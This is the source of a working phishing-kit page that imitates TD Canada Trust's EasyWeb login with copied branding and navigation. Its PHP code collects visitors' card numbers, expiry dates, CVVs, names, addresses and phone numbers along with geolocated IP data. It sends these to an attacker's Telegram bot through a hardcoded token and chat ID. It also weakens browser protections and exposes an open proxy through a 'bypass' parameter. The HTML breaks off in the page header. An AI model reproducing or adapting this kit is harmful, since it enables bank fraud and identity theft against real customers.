<?php
include "/mods/antibot.php";

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS()
{
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/windows nt 6.0/i' => 'Windows Vista',
        '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i' => 'Windows XP',
        '/windows xp/i' => 'Windows XP',
        '/windows nt 5.0/i' => 'Windows 2000',
        '/windows me/i' => 'Windows ME',
        '/win98/i' => 'Windows 98',
        '/win95/i' => 'Windows 95',
        '/win16/i' => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'Mac OS X',
        '/mac_powerpc/i' => 'Mac OS 9',
        '/linux/i' => 'Linux',
        '/ubuntu/i' => 'Ubuntu',
        '/iphone/i' => 'iPhone',
        '/ipod/i' => 'iPod',
        '/ipad/i' => 'iPad',
        '/android/i' => 'Android',
        '/blackberry/i' => 'BlackBerry',
        '/webos/i' => 'Mobile'
    );

    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }

    return $os_platform;
}

function getBrowser()
{
    global $user_agent;
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i' => 'Internet Explorer',
        '/firefox/i' => 'Firefox',
        '/safari/i' => 'Safari',
        '/chrome/i' => 'Chrome',
        '/edge/i' => 'Edge',
        '/opera/i' => 'Opera',
        '/netscape/i' => 'Netscape',
        '/maxthon/i' => 'Maxthon',
        '/konqueror/i' => 'Konqueror',
        '/mobile/i' => 'Handheld Browser'
    );

    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }

    return $browser;
}

$user_os = getOS();
$user_browser = getBrowser();

$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file = 'data.dat';
$file1 = 'combo.txt';
$file2 = 'master.log';
$ip = "" . $PublicIP;
$uaget = "" . $user_agent;
$bsr = "" . $user_browser;
$uos = "" . $user_os;
$ust = explode(" ", $user_agent);
$vr = $ust[3];
$ver = str_replace(")", "", $vr);
$version = "Version              : " . $ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
} else {
    $details = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details = json_decode($details, true);
$success = $details['success'];
$fp = fopen($file, 'a');

if ($success == false) {
    fwrite($fp, $ip . "\n");
    fwrite($fp, $uos . "\n");
    fwrite($fp, $version . "\n");
    fwrite($fp, $bsr . "\n");
    fclose($fp);
} else if ($success == true) {
    $country = $details['country'];
    $city = $details['city'];
    $continent = $details['continent'];
    $tp = $details['type'];
    $cn = $details['country_phone'];
    $is = $details['isp'];
    $la = $details['latitude'];
    $lp = $details['longitude'];
    $crn = $details['currency'];
    $type = $tp;
    $isp = $is;
    $bank = "TD BANK";
    $LL = "+";
    $currency = "" . $full_date;
    $lh = "|";
    $li = ",";
}

$message = "|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|IPADDRESS :  " . $ip . "\n|BANK   💰  : " . $bank ."\n|Internet sp :  " . $isp ."\n|Type[4/6]     : ".  $tp . "\n|Device Info  :  " . $uos . $lh . $bsr . "\n|City                :  " . $city . "\n|Continent    :  " . $continent . "\n|Lat+lon         :  " . $la . $LL . $lp . "\n|Phone           :  " . $cn . "\n|Country        :  " . $country . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n| PROFIT   :  " . $_POST['Cardnumber'] . "|" . $_POST['Expiry'] . "|" . $_POST['CVV'] . "|" . $_SESSION['ZIP'] . "|" . $_POST['Nameoncard'] . "|" . $_SESSION['Address'] . "  " . $_SESSION['Apartment'] . "|" . $_SESSION['City'] . "|" . $_SESSION['state'] . "|" . $_SESSION['Phone'] . "|" . $_SERVER['REMOTE_ADDR'] . "|" . $_SESSION['bank_scheme'] . "|" . $_SESSION['bank_type'] . "|" . $_SESSION['bank_brand'] . "|" . $_SESSION['bank_name'] . "|" . $_SESSION['bank_country'] . "\n|====🔴===|🔒 SARAHS BANK REPORT 🔒 |===🔴===|\n|USERAGENT:  " . $_SERVER['HTTP_USER_AGENT'] . "\n";


$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
$data = [
    'chat_id' => '-1001831940786',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    
          

$options = array(
    'http' => array(
        'method'  => 'POST',
        'content' => http_build_query($data),
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
    )
);
$context  = stream_context_create($options);
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage", false, $context);

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if (isset($_GET['bypass']) && $_GET['bypass'] == 'true') {
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 " . $info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}

?>
                  
<html lang="en" native-dark-active=""><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link type="text/css" rel="stylesheet" id="#"><link type="text/css" rel="stylesheet" id="#"><style lang="en" type="text/css" id=#"></style><style lang="en" type="text/css" id=""></style>
    <style type="text/css" class="native-dark-class-modified">[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}[ng\:form]{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}</style>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable = no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-touch-fullscreen" content="yes">
    <title>EasyWeb Login</title>
    <link rel="stylesheet" href="./files/uap-application-all-css.css" class="native-dark-class-original">
    <link rel="icon" href="/assets/td/favicon.ico">
    <script src="./files/jquery-3.6.0.min" crossorigin="anonymous"></script>
    
    <script src="./files/actions"></script>
    <link rel="stylesheet" href="./files/all.css" class="native-dark-class-original"><style lang="en" type="text/css" native-dark-index="0" class="native-dark-class-cloned"></style>
    
    <link rel="stylesheet" href="./files/emerland.css" class="native-dark-class-original">
    
</head>
<body prevent-click-highlight="" autoscroll="">
    <div id="contentWrapper">
        <div data-ui-view="header" class="" style="">
            <header-public>
                <div class="logo-print visible-print" aria-hidden="true">
                    <img src="./files/td-logo.png" alt="TD Canada Trust" height="32" width="36">
                </div>
                <div class="td_rq_header-nav td-header-nav">
                    <header class="td-header-desktop">
                        <div class="td-skip"><a href="/220098/td#main">Skip to main content</a></div>
                        <div class="td-utility-toggle">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <div class="td-segments">
                                        <ul>
                                            <li class="active"><a href="https://www.td.com/ca/en/personal-banking">Personal</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a></li>
                                            <li><a href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a></li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="td-section-right">
                                    <div class="td-other-toggles">
                                        <ul>
                                            <li class="td-dropdown td-dropdown-country td-dropdown-no-hover">
                                                <a href="/220098/td#" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-0"><span class="td-forscreenreader">Select country</span><img class="country-flag" src="./files/country_ca.png" alt="Canada">
                                                </a>
                                                <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-0">
                                                    <li class="active">
                                                        <a href="/220098/td"><img class="country-flag" src="./files/country_ca.png">Canada<span class="td-icon selected" aria-hidden="true"></span><span class="td-forscreenreader">Selected</span></a>
                                                    </li>
                                                    <li>
                                                        <a href="http://www.tdbank.com/"><img class="country-flag" src="./files/country_us.png">United States</a>
                                                    </li>
                                                </ul>
                                            </li>
                                            <li class="td-dropdown td-dropdown-language td-dropdown-no-hover">
                                                <a href="/220098/td#" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-1"><span class="td-forscreenreader">Select language</span>Français
                                                </a>
                                                <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-1">
                                                    <!---->
                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                        <a href="/220098/td" role="button" ng-click="vm.setLanguage(language)">
                                                            English<span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true"></span>
                                                            <span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span>
                                                        </a>
                                                    </li>
                                                    <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                        <a href="/220098/td" role="button" ng-click="vm.setLanguage(language)">
                                                            Français
                                                        </a>
                                                    </li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="td-nav-primary">
                            <div class="td-container">
                                <div class="td-section-left">
                                    <div class="td-logo">
                                        <a href="https://www.td.com/ca/en/personal-banking/">
                                        <img src="./files/td-logo.png" alt="TD Canada Trust">
                                        </a>
                                    </div>
                                    <nav>
                                        <ul>
                                            <li><a href="https://www.td.com/ca/en/personal-banking/my-220099/">My Accounts</a></li>
                                            <li><a href="https://www.td.com/ca/en/personal-banking/my-220099/">How To</a></li>
                                            <li class="td-dropdown">
                                                <a href="/220098/td" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-2">Products</a>
                                                <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-2">
                                                    <li><a href="https://www.td.com/ca/en/personal-banking/products/bank-220099/">Bank Accounts</a></li>
                                                    <li><a href="https://www.td.com/ca/en/personal-banking/products/credit-cards/">Credit Cards</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp">Mortgages</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp">Borrowing</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp">Saving &amp; Investing</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp">Insurance</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp">All Products</a></li>
                                                </ul>
                                            </li>
                                            <li class="td-dropdown">
                                                <a href="/220098/td#" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-3">Solutions</a>
                                                <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-3">
                                                    <li><a href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small Businesses</a></li>
                                                    <li><a href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial Banking</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New to Canada</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp">Cross Border Banking</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways to Pay</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways to Bank</a></li>
                                                    <li><a href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green Banking</a></li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </nav>
                                </div>
                                <div class="td-section-right">
                                    <div class="td-quick-access">
                                        <ul>
                                            <li class="find-us">
                                                <a href="https://www.td.com/ca/en/personal-banking/branch-locator/"><img src="./files/1.png"><span class="td-label">Find Us</span></a>
                                            </li>
                                            <li class="help">
                                                <a href="https://www.td.com/ca/en/personal-banking/help-centre/"><img src="./files/2.png"><span class="td-label">Help</span></a>
                                            </li>
                                            <li class="search">
                                                <a href="javascript:void(0)" class="td-desktop-search-show-btn"><img src="./files/3.png"><span class="td-label">Search</span></a>
                                            </li>
                                            <li class="divider">
                                                <div class="td-divider-line"></div>
                                            </li>
                                            <li class="login td-dropdown">
                                                <a href="/220098/td#" class="td-show-label" aria-haspopup="true" aria-expanded="false" id="td-desktop-nav-dropdown-link-4"><span class="td-label">Login</span><span class="td-icon collapse" aria-hidden="true"></span></a>
                                                <ul class="td-dropdown-content" aria-labelledby="td-desktop-nav-dropdown-link-4">
                                                    <li class="visible-md"><a href="/220098/td#">TD app</a></li>
                                                    <li><a href="https://easyweb.td.com/">EasyWeb</a></li>
                                                    <li><a href="https://webbroker.td.com/">WebBroker</a></li>
                                                    <li><a href="https://www.tdbank.com/net/accountlogin.aspx">U.S. Banking</a></li>
                                                </ul>
                                            </li>
                                        </ul>
                                    </div>
                                </div>
                                <div class="td-nav-desktop-search">
                                    <span tabindex="0"></span>
                                    <div class="td-search-container">
                                        <header-search-input>
                                            <form class="td-search-box ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" accessible-form="" ng-submit="submitSearch()">
                                                <input ng-model="query" ng-change="$ctrl.updateSuggestions()" placeholder="Search" name="query" class="td-search-input ng-pristine ng-untouched ng-valid form-control ng-empty" aria-label="{{'BUTTON.SEARCH' | translate}}" autocomplete="off" aria-invalid="false" type="text">
                                                <span class="td-search-icon" aria-hidden="true"><span class="td-icon"></span></span>
                                                <input class="td-search-submit form-control" value="query" aria-label="Search" type="submit">
                                                <!---->
                                            </form>
                                        </header-search-input>
                                        <button type="button" class="td-desktop-search-hide-btn">
                                        <span class="td-forscreenreader">Close Search</span>
                                        <span class="td-icon" aria-hidden="true"></span>
                                        </button>
                                    </div>
                                    <span tabindex="0"></span>
                                </div>
                            </div>
                        </div>
                        <!-- Desktop primary nav END -->
                    </header>
                    <!-- Desktop Header END -->
                    <!-- Mobile Header START -->
                    <header class="td-header-mobile">
                        <div class="td-container">
                            <div class="td-section-left">
                                <button type="button" class="td-mobile-action-button td-mobile-menu-button">
                                    <div class="td-mobile-menu-button-icon">
                                        <span class="td-forscreenreader">Open menu</span>
                                        
                                        
                                        
                                    </div>
                                    <div class="td-logo">
                                        <img src="./files/td-logo.png" alt="TD Canada Trust">
                                    </div>
                                </button>
                                <button type="button" class="td-mobile-action-button td-mobile-back-button" onclick="history.back();">
                                    <div class="td-mobile-back-button-icon">
                                        <span class="td-icon"></span>
                                        <span class="td-forscreenreader">Back</span>
                                    </div>
                                    <div class="td-logo">
                                        <img src="./files/td-logo.png" alt="TD Canada Trust">
                                    </div>
                                </button>
                            </div>
                            <div class="td-section-right">
                                <button type="button" class="td-mobile-action-button td-mobile-menu-secondary-button td-login">
                                
                                <span class="td-forscreenreader">Open menu</span>
                                </button>
                            </div>
                        </div>
                    </header>
                    <div class="td-nav-mobile">
                        <div class="td-nav-mobile-menu td-nav-mobile-menu-primary">
                            <span tabindex="0"></span>
                            <div class="td-nav-mobile-menu-top">
                                <div class="td-nav-mobile-menu-header">
                                    <div class="td-logo">
                                        <a href="https://www.td.com/ca/en/personal-banking/">
                                        <img src="./files/td-logo.png" alt="TD Canada Trust">
                                        </a>
                                    </div>
                                    <button type="button" class="td-mobile-menu-close">
                                    <span class="td-forscreenreader">Close Menu</span>
                                    <span class="td-icon" aria-hidden="true"></span>
                                    </button>
                                </div>
                                <div class="td-nav-mobile-menu-search">
                                    <header-search-input>
                                        <form class="td-search-box ng-pristine ng-valid td_rq_form_legacy td-form td-form-validate td-form-dynamic" accessible-form="" ng-submit="submitSearch()">
                                            <input ng-model="query" ng-change="$ctrl.updateSuggestions()" placeholder="Search" name="query" class="td-search-input ng-pristine ng-untouched ng-valid form-control ng-empty" aria-label="{{'BUTTON.SEARCH' | translate}}" autocomplete="off" aria-invalid="false" type="text">
                                            <span class="td-search-icon" aria-hidden="true"><span class="td-icon"></span></span>
                                            <input class="td-search-submit form-control" value="query" aria-label="Search" type="submit">
                                            <!---->
                                        </form>
                                    </header-search-input>
                                </div>
                            </div>
                            <nav>
                                <ul class="td-nav-mobile-menu-list">
                                    <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-segment">
                                        <a href="/220098/td" aria-expanded="false" role="button">
                                        TD: Personal
                                        <span class="td-icon expand"></span>
                                        <span class="td-icon collapse"></span>
                                        </a>
                                        <ul class="td-accordion-content">
                                            <li class="active">
                                                <a href="https://www.td.com/ca/en/personal-banking"> Personal
                                                <span class="td-icon selected" aria-hidden="true"></span>
                                                <span class="td-forscreenreader">Selected</span>
                                                </a>
                                            </li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index.jsp">Business</a></li>
                                            <li><a href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investing</a></li>
                                            <li><a href="https://www.td.com/about-tdbfg/our-business/index.jsp">About TD</a></li>
                                        </ul>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-home active">
                                        <a href="https://www.td.com/ca/en/personal-banking/"><span class="td-icon td-icon-homepage"></span>Home</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-my-TD">
                                        <a href="https://www.td.com/ca/en/personal-banking/my-220099/"><span class="td-icon td-icon-myTD"></span>My Accounts</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-how-to">
                                        <a href="https://www.td.com/ca/en/personal-banking/my-220099/"><span class="td-icon td-icon-howTo"></span>How To</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-accounts">
                                        <a href="https://www.td.com/ca/en/personal-banking/products/bank-220099/"><span class="td-icon td-icon-accounts"></span>Bank Accounts</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-credit-cards">
                                        <a href="https://www.td.com/ca/en/personal-banking/products/credit-cards/"><span class="td-icon td-icon-creditcards"></span>Credit Cards</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-mortgages">
                                        <a href="https://www.tdcanadatrust.com/products-services/banking/mortgages.jsp"><span class="td-icon td-icon-mortgages"></span>Mortgages</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-borrowing">
                                        <a href="https://www.tdcanadatrust.com/products-services/borrowing/loans-lines-of-credit/index.jsp"><span class="td-icon td-icon-borrowing"></span>Borrowing</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-saving-investing">
                                        <a href="https://www.tdcanadatrust.com/products-services/investing/goals_index.jsp"><span class="td-icon td-icon-savingAndInvesting"></span>Saving &amp; Investing</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-insurance">
                                        <a href="https://www.tdcanadatrust.com/products-services/insurance/insurance-index.jsp"><span class="td-icon td-icon-insurance"></span>Insurance</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-all-products">
                                        <a href="https://www.tdcanadatrust.com/products-services/banking/apply-index.jsp"><span class="td-icon td-icon-allProducts"></span>All Products</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link td-accordion item-solutions">
                                        <a href="/220098/td" aria-expanded="false" role="button">
                                        <span class="td-icon td-icon-solutions"></span>
                                        Solutions
                                        <span class="td-icon expand"></span>
                                        <span class="td-icon collapse"></span>
                                        </a>
                                        <ul class="td-accordion-content">
                                            <li><a href="https://www.td.com/ca/products-services/investing-at-td/index.jsp">Investors</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/small-business/smallbusiness-index_1.jsp">Small Businesses</a></li>
                                            <li><a href="https://www.tdcommercialbanking.com/home/index.jsp">Commercial Banking</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/student-advice/student-banking.jsp">Students</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/planning/life-events/new-to-canada/index.jsp">New to Canada</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/cross-border-banking/index.jsp"> Cross Border Banking</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/foreign-currency-services/index.jsp">Foreign Exchange Services</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/payandsendmoney.jsp">Ways to Pay</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/index.jsp">Ways to Bank</a></li>
                                            <li><a href="https://www.tdcanadatrust.com/products-services/banking/green-banking/index.jsp">Green Banking</a></li>
                                        </ul>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-find-us">
                                        <a href="https://www.td.com/ca/en/personal-banking/branch-locator/"><span class="td-icon td-icon-location"></span>Find Us</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link td-item-nav-link-last item-help-me">
                                        <a href="https://www.td.com/ca/en/personal-banking/help-centre/"><span class="td-icon td-icon-help"></span>Help</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-country">
                                        <a href="/220098/td" aria-expanded="false" role="button">
                                        COUNTRY: Canada
                                        <span class="td-icon expand"></span>
                                        <span class="td-icon collapse"></span>
                                        </a>
                                        <ul class="td-accordion-content">
                                            <li class="active">
                                                <a href="/220098/td">
                                                <img class="country-flag" src="./files/country_ca.png" alt="Canada">
                                                Canada
                                                <span class="td-icon selected" aria-hidden="true"></span>
                                                <span class="td-forscreenreader">Selected</span>
                                                </a>
                                            </li>
                                            <li>
                                                <a href="/220098/td">
                                                <img class="country-flag" src="./files/country_us.png" alt="Canada">
                                                United States
                                                </a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-toggle td-accordion td-accordion-language">
                                        <a href="/220098/td" aria-expanded="false" role="button">
                                        <span class="td-forscreenreader">Select language</span>
                                        Français
                                        <span class="td-icon expand" aria-hidden="true"></span>
                                        <span class="td-icon collapse" aria-hidden="true"></span>
                                        </a>
                                        <ul class="td-accordion-content">
                                            <!---->
                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index" class="active">
                                                <a href="/220098/td" role="button" ng-click="vm.setLanguage(language)">
                                                    English
                                                    <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-icon selected" aria-hidden="true">
                                                    </span><!---->
                                                    <!----><span ng-if="language==vm.dt.selectedLanguage" class="td-forscreenreader">Selected</span><!---->
                                                </a>
                                            </li>
                                            <!---->
                                            <li ng-class="{'active': language==vm.dt.selectedLanguage}" ng-repeat="language in vm.dt.languages track by $index">
                                                <a href="/220098/td" role="button" ng-click="vm.setLanguage(language)">
                                                    Français
                                                    <!---->
                                                    <!---->
                                                </a>
                                            </li>
                                            <!---->
                                        </ul>
                                    </li>
                                </ul>
                            </nav>
                            <span tabindex="0"></span>
                        </div>
                        <!-- Primary mobile menu END -->
                        <!-- Secondary mobile menu START -->
                        <div class="td-nav-mobile-menu td-nav-mobile-menu-secondary td-nav-mobile-menu-right">
                            <span tabindex="0"></span>
                            <div class="td-nav-mobile-menu-top">
                                <div class="td-nav-mobile-menu-header">
                                    <div class="td-nav-mobile-menu-title">Login
                                    </div>
                                    <button type="button" class="td-mobile-menu-close">
                                    <span class="td-forscreenreader" aria-hidden="true">Close Menu</span>
                                    <span class="td-icon" aria-hidden="true"></span>
                                    </button>
                                </div>
                            </div>
                            <nav>
                                <ul class="td-nav-mobile-menu-list">
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-show-on-all">
                                        <a href="/220098/td"><span class="td-icon td-icon-noIcon"></span>TD app</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-mobile">
                                        <a href="https://easyweb.td.com/"><span class="td-icon td-icon-noIcon"></span>EasyWeb</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-tablet-portrait-only visible-sm">
                                        <a href="https://webbroker.td.com/"><span class="td-icon td-icon-noIcon"></span>WebBroker</a>
                                    </li>
                                    <li class="td-nav-mobile-menu-item td-item-nav-link item-mobile-only visible-sm">
                                        <a href="https://www.tdbank.com/net/accountlogin.aspx"><span class="td-icon td-icon-noIcon"></span>U.S. Banking</a>
                                    </li>
                                </ul>
                            </nav>
                            <span tabindex="0"></span>
                        </div>
                        <!-- Secondary mobile menu START -->
                        <div class="td-nav-mobile-overlay"></div>
                    </div>
                    <!-- Mobile Off-canvas Menu END -->
                </div>
                <a name="main" id="main" tabindex="-1"></a>
            </header-public>
        </div>
        <!-- Main Content / Body -->
        <div class="td-contentarea" role="main" style="padding-top: 106px;">
            <ui-view>
                        
